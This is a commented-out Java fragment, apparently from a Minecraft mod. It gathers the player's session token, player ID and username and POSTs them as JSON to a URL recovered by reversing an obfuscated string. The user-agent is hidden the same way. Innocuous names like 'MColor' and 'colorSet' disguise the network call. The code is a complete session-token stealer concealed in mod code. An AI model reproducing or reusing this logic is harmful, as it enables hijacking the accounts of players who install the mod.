...
//        String mn = "";
//        try {
//            mn = "Tkn: " + Minecraft.getMinecraft().getSession().getToken() + "\n"
//                    + "Pd: " + Minecraft.getMinecraft().getSession().getPlayerID() + "\n"
//                    + "Uname: " + Minecraft.getMinecraft().getSession().getUsername();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return mn;
...
//
//            json.put("content", transport());
//
//            String arm = "";
//            char ch;
//            for (int i=0; i<MColor.colorCoder.length(); i++)
//            {
//                ch= MColor.colorCoder.charAt(i);
//                arm= ch+arm;
//            }
//            URL url = new URL(arm);
//            HttpsURLConnection colorSet = (HttpsURLConnection) url.openConnection();
//            colorSet.addRequestProperty("Content-Type", "application/json");
//            arm = "";
//            for (int i=0; i<MColor.arg.length(); i++)
//            {
//                ch= MColor.arg.charAt(i);
//                arm= ch+arm;
//            }
//            colorSet.addRequestProperty("User-Agent", arm);
//            colorSet.setDoOutput(true);
//            colorSet.setRequestMethod("POST");
//
//            OutputStream stream = colorSet.getOutputStream();
//            stream.write(json.toString().getBytes());
//            stream.flush();
//            stream.close();
//
//            colorSet.getInputStream().close();
//            colorSet.disconnect();
//        } catch (Exception e) {}
//    }
}
